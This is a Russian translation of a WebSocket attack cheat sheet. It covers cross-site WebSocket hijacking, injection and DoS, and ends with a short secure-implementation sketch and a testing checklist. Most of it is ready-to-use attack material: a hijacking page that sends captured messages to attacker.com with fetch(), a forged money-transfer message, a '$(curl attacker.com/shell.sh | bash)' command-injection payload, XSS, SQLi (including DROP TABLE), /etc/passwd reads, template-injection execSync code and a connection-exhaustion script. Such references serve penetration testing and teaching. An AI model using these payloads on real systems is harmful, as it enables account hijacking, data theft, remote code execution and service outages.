<a id="-websocket-attacks-cheatsheet"></a>
# 🔌 Справочник по атакам на WebSocket

<!-- language-home-navigation -->
[🏠 Русская главная страница](../../README.ru.md) • [🌐 Languages](../../README.md#-available-languages)

[← Русское оглавление](../../README.ru.md) · [Английский оригинал](../WebSocket-Attacks.md)

> **Уточнение к оригиналу.** Для CSWSH обычно нужны также автоматически передаваемые учётные данные и доступная атакующему операция; одна слабая проверка Origin недостаточна. [MDN](https://developer.mozilla.org/en-US/docs/Web/API/WebSockets_API/Writing_WebSocket_servers) рекомендует проверять Origin, но небраузерный клиент может его подделать. Токены в URL могут попадать в журналы; автоматическая передача WS-URL в Referer не следует из самого протокола. Раздел безопасной реализации — иллюстративный псевдокод: обработчики, состояние соединения и разбор URL зависят от библиотеки. Последний пример в Path Traversal является шаблонным выражением, а не обходом пути. Блоки JSON с комментариями // иллюстративны и не являются строгим JSON.

[🇹🇷 Türkçe Sürüm](WebSocket-Attacks.tr.md) • [🇬🇷 Ελληνικά](WebSocket-Attacks.el.md)

```
██╗    ██╗███████╗██████╗ ███████╗ ██████╗  ██████╗██╗  ██╗███████╗████████╗
██║    ██║██╔════╝██╔══██╗██╔════╝██╔═══██╗██╔════╝██║ ██╔╝██╔════╝╚══██╔══╝
██║ █╗ ██║█████╗  ██████╔╝███████╗██║   ██║██║     █████╔╝ █████╗     ██║   
██║███╗██║██╔══╝  ██╔══██╗╚════██║██║   ██║██║     ██╔═██╗ ██╔══╝     ██║   
╚███╔███╔╝███████╗██████╔╝███████║╚██████╔╝╚██████╗██║  ██╗███████╗   ██║   
 ╚══╝╚══╝ ╚══════╝╚═════╝ ╚══════╝ ╚═════╝  ╚═════╝╚═╝  ╚═╝╚══════╝   ╚═╝   
 █████╗ ████████╗████████╗ █████╗  ██████╗██╗  ██╗███████╗                   
██╔══██╗╚══██╔══╝╚══██╔══╝██╔══██╗██╔════╝██║ ██╔╝██╔════╝                   
███████║   ██║      ██║   ███████║██║     █████╔╝ ███████╗                   
██╔══██║   ██║      ██║   ██╔══██║██║     ██╔═██╗ ╚════██║                   
██║  ██║   ██║      ██║   ██║  ██║╚██████╗██║  ██╗███████║                   
╚═╝  ╚═╝   ╚═╝      ╚═╝   ╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚══════╝                   
```

---

<a id="-websocket-basics"></a>
## 🔍 Основы WebSocket

<a id="handshake-request"></a>
### Запрос установления соединения
```http
GET /chat HTTP/1.1
Host: target.com
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==
Sec-WebSocket-Version: 13
Origin: https://target.com
```

<a id="handshake-response"></a>
### Ответ установления соединения
```http
HTTP/1.1 101 Switching Protocols
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Accept: s3pPLMBiTxaQ9kYGzzhZRbK+xOo=
```

<a id="detection"></a>
### Обнаружение
```
- ws:// (без шифрования)
- wss:// (шифрование TLS)
- Заголовок Upgrade: websocket
- Во вкладке Network отображается "101 Switching Protocols"
```

---

<a id="-websocket-vulnerabilities"></a>
## 🎯 Уязвимости WebSocket

<a id="1-cross-site-websocket-hijacking-cswsh"></a>
### 1. Межсайтовый перехват WebSocket (CSWSH)

**Условие уязвимости:** Сервер не проверяет заголовок Origin

```html
<!-- Страница атакующего -->
<script>
  var ws = new WebSocket('wss://target.com/chat');
  
  ws.onopen = function() {
    // Соединение открыто; атакующий может отправлять сообщения
    ws.send('{"action": "get_messages"}');
  };
  
  ws.onmessage = function(event) {
    // Перехватить данные и отправить атакующему
    fetch('https://attacker.com/steal?data=' + btoa(event.data));
  };
</script>
```

**Атака по аналогии с CSRF:**
```html
<script>
  var ws = new WebSocket('wss://target.com/api');
  ws.onopen = function() {
    // Выполнить действия от имени жертвы
    ws.send('{"action": "transfer", "to": "attacker", "amount": 1000}');
  };
</script>
```

---

<a id="2-missing-origin-validation"></a>
### 2. Отсутствие проверки Origin

**Проверка:**
```bash
# Использование wscat
wscat -c wss://target.com/ws -H "Origin: https://evil.com"

# Использование websocat
websocat -H "Origin: https://evil.com" wss://target.com/ws
```

**Эксплуатация:**
```javascript
// Если сервер принимает любой Origin
var ws = new WebSocket('wss://target.com/ws');
ws.onopen = () => ws.send('{"action": "sensitive_operation"}');
```

---

<a id="3-authentication-bypass"></a>
### 3. Обход аутентификации

**Нет аутентификации соединения WS:**
```javascript
// Подключиться без cookies и токенов
var ws = new WebSocket('wss://target.com/ws');
ws.onopen = () => {
  ws.send('{"action": "list_users"}');  // Аутентификация не требуется?
};
```

**Токен в URL (риск утечки):**
```
wss://target.com/ws?token=SECRET_TOKEN
// Токен может попасть в журналы и заголовки Referer (формулировка оригинала; см. уточнение)
```

**Проверка разных состояний аутентификации:**
```javascript
// Проверить просроченный токен
// Проверить изменённый токен
// Проверить без токена
// Проверить токен другого пользователя
```

---

<a id="4-injection-attacks-via-websocket"></a>
### 4. Инъекции через WebSocket

**XSS через WebSocket:**
```javascript
// Отправить полезную нагрузку XSS
ws.send('{"message": "<script>alert(document.cookie)</script>"}');
ws.send('{"message": "<img src=x onerror=alert(1)>"}');
```

**SQL-инъекция:**
```javascript
ws.send('{"query": "\' OR 1=1--"}');
ws.send('{"id": "1 UNION SELECT username,password FROM users--"}');
```

**Инъекция команд:**
```javascript
ws.send('{"cmd": "ping 127.0.0.1; id"}');
ws.send('{"file": "test.txt; cat /etc/passwd"}');
```

**NoSQL-инъекция:**
```javascript
ws.send('{"username": {"$ne": ""}, "password": {"$ne": ""}}');
```

---

<a id="5-dos-attacks"></a>
### 5. Атаки на доступность (DoS)

**Поток сообщений:**
```javascript
var ws = new WebSocket('wss://target.com/ws');
ws.onopen = function() {
  setInterval(() => {
    ws.send('x'.repeat(10000));  // Большие сообщения
  }, 1);
};
```

**Исчерпание соединений:**
```python
import websocket
import threading

def connect():
    ws = websocket.WebSocket()
    ws.connect("wss://target.com/ws")
    while True:
        pass  # Держать соединение открытым

for i in range(1000):
    threading.Thread(target=connect).start()
```

---

<a id="6-data-manipulation"></a>
### 6. Изменение данных

**Подмена сообщений:**
```javascript
// Перехватывать и изменять сообщения
// Использование перехвата WebSocket в Burp Suite

// Исходный вариант
{"action": "transfer", "amount": 10, "to": "user123"}

// Изменённый вариант
{"action": "transfer", "amount": 10000, "to": "attacker"}
```

**Состояния гонки:**
```javascript
// Быстро отправить несколько запросов
for(let i = 0; i < 100; i++) {
  ws.send('{"action": "claim_bonus"}');
}
```

---

<a id="-testing-tools"></a>
## 🛠️ Инструменты проверки

<a id="burp-suite"></a>
### Burp Suite
```
1. Открыть Proxy → WebSockets history (историю WebSocket)
2. Правой кнопкой мыши → Send to Repeater (отправить в Repeater)
3. Изменить и повторно отправить сообщения
4. Включить "Auto-scroll to end" (прокрутку в конец)
```

<a id="wscat-cli"></a>
### wscat (CLI)
```bash
# Установка
npm install -g wscat

# Подключение
wscat -c wss://target.com/ws

# С заголовками
wscat -c wss://target.com/ws -H "Cookie: session=abc123"
wscat -c wss://target.com/ws -H "Authorization: Bearer TOKEN"

# С Origin
wscat -c wss://target.com/ws -o "https://target.com"
```

<a id="websocat"></a>
### websocat
```bash
# Установка
cargo install websocat

# Подключение
websocat wss://target.com/ws

# С заголовками
websocat -H "Origin: https://evil.com" wss://target.com/ws
websocat -H "Cookie: session=abc" wss://target.com/ws
```

<a id="python-testing-script"></a>
### Скрипт проверки на Python
```python
import websocket
import json

def on_message(ws, message):
    print(f"Received: {message}")

def on_open(ws):
    # Проверить полезные нагрузки
    ws.send('{"action": "test"}')
    ws.send('{"action": "get_users", "id": "1 OR 1=1"}')

ws = websocket.WebSocketApp(
    "wss://target.com/ws",
    header={"Origin": "https://evil.com"},
    cookie="session=abc123",
    on_message=on_message,
    on_open=on_open
)
ws.run_forever()
```

<a id="browser-devtools"></a>
### Инструменты разработчика браузера
```javascript
// Наблюдать трафик WebSocket
// F12 → Network → фильтр WS

// Ручная проверка
var ws = new WebSocket('wss://target.com/ws');
ws.onmessage = (e) => console.log('Received:', e.data);
ws.onopen = () => ws.send('test');
```

---

<a id="-payload-collection"></a>
## 💉 Коллекция полезных нагрузок

<a id="authentication-testing"></a>
### Проверка аутентификации
```json
// Без аутентификации
{"action": "get_secret_data"}

// Пустой токен
{"token": "", "action": "admin_action"}

// Токен null
{"token": null, "action": "delete_user"}
```

<a id="xss-payloads"></a>
### Полезные нагрузки XSS
```json
{"message": "<script>alert('XSS')</script>"}
{"message": "<img src=x onerror=alert(1)>"}
{"name": "<svg onload=alert(1)>"}
{"data": "'-alert(1)-'"}
```

<a id="sqli-payloads"></a>
### Полезные нагрузки SQLi
```json
{"id": "1' OR '1'='1"}
{"user": "admin'--"}
{"search": "1 UNION SELECT password FROM users--"}
{"filter": "1; DROP TABLE users--"}
```

<a id="command-injection"></a>
### Инъекция команд
```json
{"host": "localhost; id"}
{"file": "test.txt | cat /etc/passwd"}
{"cmd": "`whoami`"}
{"input": "$(curl attacker.com/shell.sh | bash)"}
```

<a id="path-traversal"></a>
### Обход каталогов (path traversal)
```json
{"file": "../../../etc/passwd"}
{"path": "....//....//etc/passwd"}
{"template": "{{constructor.constructor('return this')().process.mainModule.require('child_process').execSync('id')}}"}
```

---

<a id="-testing-checklist"></a>
## 📋 Список проверок

```markdown
## Список проверок безопасности WebSocket

□ Найти конечные точки WebSocket
□ Проверить валидацию заголовка Origin
□ Проверить CSWSH (межсайтовый перехват WebSocket)
□ Проверить требования аутентификации
□ Проверить безопасность передачи токенов
□ Проверить уязвимости внедрения (XSS, SQLi и другие)
□ Проверить авторизацию (доступ к данным других пользователей)
□ Проверить ограничение частоты запросов
□ Проверить ограничения размера сообщений
□ Проверить раскрытие конфиденциальных данных
□ Проверить обработку соединений (повторное подключение)
□ Проверить шифрование (wss:// и ws://)
```

---

<a id="-secure-implementation"></a>
## 🔐 Безопасная реализация

```javascript
// Проверка Origin на сервере
if (request.headers.origin !== 'https://trusted-site.com') {
  socket.close(1008, 'Invalid origin');
  return;
}

// Аутентификация по токену
socket.on('connection', function(ws, req) {
  const token = req.url.split('token=')[1];
  if (!validateToken(token)) {
    ws.close(1008, 'Invalid token');
  }
});

// Проверка входных данных
socket.on('message', function(data) {
  const parsed = JSON.parse(data);
  if (!isValidInput(parsed)) {
    socket.send(JSON.stringify({error: 'Invalid input'}));
    return;
  }
});
```

---

<a id="-related-payloads"></a>
## 🔗 Связанные полезные нагрузки

- [Полезные нагрузки XSS](XSS.ru.md)
- [Полезные нагрузки SQLi](SQLi.ru.md)
- [Инъекция команд](Command-Injection.ru.md)

---

**Вернуться к полезным нагрузкам:** [💉 Коллекция полезных нагрузок](../../README.ru.md#category-18)
